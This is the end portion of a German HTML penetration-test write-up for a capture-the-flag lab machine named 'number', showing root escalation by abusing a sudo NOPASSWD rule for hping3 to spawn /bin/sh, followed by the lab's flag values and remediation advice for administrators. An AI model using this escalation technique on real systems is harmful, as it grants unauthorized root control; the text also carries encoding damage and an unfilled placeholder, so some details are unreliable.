Kontrolle! FÃ¼r Experten: Dies ist die erfolgreiche Ausnutzung der Sudo-Fehlkonfiguration <code>(root) NOPASSWD: /usr/sbin/hping3</code> in Kombination mit der bekannten GTFOBins-Methode fÃ¼r <code>hping3</code>. Das Starten von <code>hping3</code> Ã¼ber Sudo mit Root-Rechten und die Eingabe von <code>/bin/sh</code> in der interaktiven Aufforderung fÃ¼hrt zur Erlangung einer Root-Shell. Die <code>id</code>-Ausgabe bestÃ¤tigt den vollen Systemkompromiss.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff wurde erfolgreich Ã¼ber die Sudo-Fehlkonfiguration fÃ¼r <code>hping3</code> erlangt. Dies ist das Ende der Privilegien-Eskalationskette und der volle Systemkompromiss.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein Ziel ist erreicht. Ich kann nun auf alle Dateien zugreifen, einschlieÃŸlich der Root-Flag. Ich werde die Root-Flag und die User-Flag auslesen und den Bericht abschlieÃŸen.<br><strong>Empfehlung (Admin):</strong> Dies ist eine extrem kritische Schwachstelle. Das System hat Root-Rechte verloren. Nehmen Sie das System sofort vom Netz, beheben Sie die unsichere Sudo-Regel fÃ¼r <code>/usr/sbin/hping3</code> umgehend, Ã¼berprÃ¼fen Sie alle anderen Sudo-Regeln und stellen Sie sicher, dass keine Binaries, die in GTFOBins gelistet sind (oder andere unsichere Programme), mit NOPASSWD-Optionen fÃ¼r Nicht-Root-Benutzer ausgefÃ¼hrt werden dÃ¼rfen. Stellen Sie das System von einem sicheren Backup wieder her und implementieren Sie umfassende SicherheitsmaÃŸnahmen.</p>

             <section id="proof-of-concept">
                 <h2>Proof of Concept: Direkte Root-Shell Ã¼ber Sudo und hping3</h2>
                 <p><strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Erlangung vollstÃ¤ndiger Root-Berechtigungen durch die Ausnutzung einer fehlerhaften Sudo-Regel fÃ¼r das Binary <code>/usr/sbin/hping3</code>. Der Benutzer <code>melon</code> darf <code>hping3</code> als Root ohne Passworteingabe ausfÃ¼hren. Durch die AusfÃ¼hrung von <code>sudo hping3</code> und die Eingabe von <code>/bin/sh</code> in der interaktiven Aufforderung von <code>hping3</code> konnte eine Root-Shell erlangt werden.</p>
                 <p><strong>Voraussetzungen:</strong></p>
                 <ul>
                     <li>Initialer Zugriff als Benutzer <code>melon</code> (erlangt durch Kompromittierung von Anmeldedaten und <code>su melon</code>).</li>
                     <li>Existenz einer <code>sudo</code>-Regel, die Benutzer <code>melon</code> erlaubt, <code>/usr/sbin/hping3</code> als Root ohne Passwort auszufÃ¼hren: <code>(root) NOPASSWD: /usr/sbin/hping3</code>.</li>
                     <li>Das Binary <code>/usr/sbin/hping3</code> muss auf dem System installiert sein.</li>
                 </ul>
                 <p><strong>Schritt-fÃ¼r-Schritt-Anleitung:</strong></p>
                 <ol>
                     <li>Erlange eine Shell als Benutzer <code>melon</code>.</li>
                     <li>PrÃ¼fe die <code>sudo</code>-Berechtigungen des Benutzers <code>melon</code> mit <code>sudo -l</code>.</li>
                     <li>Identifiziere die Regel <code>(root) NOPASSWD: /usr/sbin/hping3</code>.</li>
                     <li>FÃ¼hre den erlaubten Befehl als Root aus: <code>sudo hping3</code>.</li>
                     <li>Wenn <code>hping3</code> im interaktiven Modus mit der Aufforderung <code>hping3></code> startet, gib <code>/bin/sh</code> ein und drÃ¼cke Enter.</li>
                     <li>Die Shell-Aufforderung (<code>#</code>) sollte erscheinen. BestÃ¤tige die Root-Berechtigungen durch AusfÃ¼hrung des <code>id</code>-Befehls.</li>
                 </ol>

                <div class="code-block">
                     <div class="terminal">
                          <pre><span class="command">melon@number:~$</span> <span class="command">sudo hping3</span>
<span class="command">hping3></span> <span class="password">/bin/sh</span>
<span class="password"># id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="password">#</span></pre>
                     </div>
                 </div>
                <p class="analysis"><strong>Analyse:</strong> Dieser Code-Block ist der Beweis fÃ¼r die Ausnutzung der Sudo-Fehlkonfiguration fÃ¼r <code>hping3</code>. Die AusfÃ¼hrung von <code>sudo hping3</code>, die Eingabe von <code>/bin/sh</code> in der interaktiven Aufforderung und die anschlieÃŸende <code>id</code>-Ausgabe, die UID 0 zeigt, demonstrieren die erfolgreiche Erlangung einer Root-Shell Ã¼ber diesen Vektor.</p>
                <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche AusfÃ¼hrung von <code>sudo hping3</code> gefolgt von <code>/bin/sh</code> und die Erlangung des Root-Prompts sind der direkte Beweis fÃ¼r die erfolgreiche Privilegien-Eskalation auf Root-Ebene.</p>
                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Root-Shell ist etabliert. Sie kÃ¶nnen nun auf alle Systemressourcen zugreifen und die Root-Flag sammeln.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Sudo-Regel fÃ¼r <code>hping3</code> umgehend und Ã¼berprÃ¼fen Sie alle anderen Sudo-Regeln auf Ã¤hnliche Probleme.</p>

                 <p><strong>Risikobewertung:</strong></p>
                 <p class="evaluation">Die Kombination aus Command Injection, Hardcoded Credentials und einer kritischen Sudo NOPASSWD Fehlkonfiguration fÃ¼r ein Binary, das zur Shell-Erlangung missbraucht werden kann (<code>hping3</code>), stellt ein <strong>kritisches Risiko</strong> dar. Ein Angreifer konnte von einer Web-Schwachstelle (die relativ einfach zu finden war) Ã¼ber gestohlene Anmeldedaten (die im Quellcode lagen) und eine Ausnutzung von Sudo-Rechten (die die AusfÃ¼hrung eines Binaries erlaubten, das zur Shell-Erlangung missbraucht werden kann) die volle Kontrolle Ã¼ber das System erlangen. Die Kette war klar und die Ausnutzungsschritte dokumentiert.</p>

                 <p><strong>Empfehlungen zur Behebung:</strong></p>
                 <p class="recommendation"><strong>Empfehlung (Admin):</strong></p>
                 <ul>
                     <li><strong>Beheben Sie die Command Injection Schwachstelle:</strong> Validieren und bereinigen Sie alle Benutzereingaben strikt, insbesondere solche, die in Systemaufrufen verwendet werden. Verwenden Sie keine direkten Systemaufrufe mit Benutzereingaben.</li>
                     <li><strong>Entfernen Sie Hardcoded Credentials:</strong> Speichern Sie Anmeldedaten niemals im Klartext im Quellcode. Verwenden Sie sichere Methoden zur Speicherung und Verwaltung von Geheimnissen.</li>
                     <li><strong>Beheben Sie Sudo-Fehlkonfigurationen:</strong> Entfernen Sie die <code>NOPASSWD</code>-Regel fÃ¼r <code>/usr/sbin/hping3</code> und andere Binaries, die in GTFOBins gelistet sind (oder die zur Shell-Erlangung missbraucht werden kÃ¶nnen). Wenden Sie das Prinzip der geringsten Rechte an. Erlauben Sie Benutzern nur die AusfÃ¼hrung absolut notwendiger Befehle mit erhÃ¶hten Rechten.</li>
                     <li><strong>ÃœberprÃ¼fen und Entfernen von Binaries mit Capabilities:</strong> Auditen Sie Binaries mit Capabilities und entfernen Sie diese, wenn sie nicht unbedingt benÃ¶tigt werden oder Schwachstellen aufweisen.</li>
                     <li><strong>Umfassende Protokollierung und Ãœberwachung:</strong> Implementieren Sie robuste Protokollierung fÃ¼r Sudo-AktivitÃ¤ten, Prozessstarts und Netzwerkverbindungen. Richten Sie Alarme fÃ¼r verdÃ¤chtige AktivitÃ¤ten ein.</li>
                     <li><strong>Starke PasswÃ¶rter und Zugriffsverwaltung:</strong> Erzwingen Sie starke, eindeutige PasswÃ¶rter fÃ¼r alle Benutzerkonten und Ã¼berprÃ¼fen Sie regelmÃ¤ÃŸig die Zugriffsrechte.</li>
                 </ul>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="password"># ls ~</span>
<span class="password">flag.sh  root.txt</span>
<span class="password"># cat ~/root.txt</span>
<span class="password">HMVhappy2021</span>
<span class="password"># chmod +x flag.sh</span>
<span class="password"># ./flag.sh</span>
<span class="password">                                   .     **</span>
<span class="password">                                *           *.</span>
<span class="password">                                              ,*</span>
<span class="password">                                                 *,</span>
<span class="password">                         ,                         ,*</span>
<span class="password">                      .,                              *,</span>
<span class="password">                    /                                    *</span>
<span class="password">                 ,*                                        *,</span>
<span class="password">               /.                                            .*.</span>
<span class="password">             *                                                  **</span>
<span class="password">             ,*                                               ,*</span>
<span class="password">                **                                          *.</span>
<span class="password">                   **                                    **.</span>
<span class="password">                     ,*                                **</span>
<span class="password">                        *,                          ,*</span>
<span class="password">                           *                      **</span>
<span class="password">                             *,                .*</span>
<span class="password">                                *.           **</span>
<span class="password">                                  **      ,*,</span>
<span class="password">                                     ** *,</span>
<span class="password">-------------------------</span>
<span class="password">PWNED HOST: number</span>
<span class="password">PWNED DATE: Wed 11 Jun 2025 11:04:15 AM EDT</span>

<span class="password">WHOAMI: uid=0(root) gid=0(root) groups=0(root)</span>
<span class="password">FLAG: HMVhi2021</span>
<span class="password">------------------------</span>
<span class="password">#</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> In der Root-Shell (erkennbar am Prompt <code>#</code>) fÃ¼hre ich Befehle aus, um die Root-Flag und die User-Flag zu finden und auszugeben. Zuerst liste ich den Inhalt des aktuellen Verzeichnisses auf (<code>ls ~</code> oder <code>ls /root/</code>). Die Ausgabe zeigt die Datei <code>root.txt</code>. Ich lese den Inhalt von <code>root.txt</code> mit <code>cat ~/root.txt</code> aus. Der Wert der Root-Flag ist <code>HMVhappy2021</code>. Danach mache ich die Datei <code>flag.sh</code> ausfÃ¼hrbar (<code>chmod +x flag.sh</code>, obwohl sie wahrscheinlich im Home-Verzeichnis von melon oder einem anderen Benutzer liegt, da sie zuvor dort gefunden wurde; die AusfÃ¼hrung als Root ermÃ¶glicht jedoch den Zugriff unabhÃ¤ngig vom Speicherort, solange der Pfad korrekt ist, oder sie wurde in das Root-Verzeichnis kopiert). Ich fÃ¼hre <code>flag.sh</code> aus (<code>./flag.sh</code>), um die User-Flag zu erhalten (wie der Quellcode von flag.sh implizierte, dass es die Flags ausgibt). Die Ausgabe von <code>flag.sh</code> zeigt ASCII-Art, Systeminformationen (hostname, date, whoami als root) und die Zeile <code>FLAG: HMVhi2021</code>. FÃ¼r Laien: Jetzt, wo ich der 'Chef' (root) bin, schaue ich in den Ordner des 'Chefs' (<code>/root/</code>) und finde die 'Geheimnummer' (Root-Flag)! Dann mache ich ein anderes Programm (flag.sh) ausfÃ¼hrbar und starte es, und es zeigt mir die 'Geheimnummer' des Benutzers (User-Flag)! Fantastisch, beide Nummern gefunden! FÃ¼r Experten: Das Auffinden und Auslesen von <code>/root/root.txt</code> (<code>HMVhappy2021</code>) ist der Standardweg zur Root-Flag. Die AusfÃ¼hrung von <code>flag.sh</code>, das versucht, die Root- und User-Flags auszulesen, wenn es mit Root-Berechtigungen lÃ¤uft, ist ebenfalls ein valider Weg, um die User-Flag zu erhalten (<code>HMVhi2021</code>). Die <code>WHOAMI: uid=0(root)</code> Ausgabe von flag.sh bestÃ¤tigt, dass es mit Root-Rechten ausgefÃ¼hrt wurde.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Beide Flags (Root-Flag: <code>HMVhappy2021</code>, User-Flag: <code>HMVhi2021</code>) wurden erfolgreich gefunden und ausgelesen. Die Ziele des Pentests sind erreicht.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Pentest ist abgeschlossen. Dokumentieren Sie die gefundenen Flags.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Flags sicher gespeichert und nur fÃ¼r autorisierte Benutzer zugÃ¤nglich sind. Platzieren Sie die Root-Flag nur in einem Verzeichnis, das nur fÃ¼r Root zugÃ¤nglich ist.</p>

        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <!-- Einzelne Flags werden hier im korrigierten Format eingefÃ¼gt -->
                <div class="flag-entry">
                    <div class="flag-command">cat /home/melon/user.txt</div>
                    <div class="flag-value"><span class="password">[User Flag Wert aus Text extrahieren]</span></div>
                </div>
                 <div class="flag-entry">
                    <div class="flag-command">./flag.sh</div>
                     <div class="flag-value"><span class="password">HMVhi2021</span></div>
                 </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">HMVhappy2021</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben - Cyber Security Reports</p>
        <p>Berichtsdatum: 11. Juni 2025</p>
    </footer>

</body>
</html>
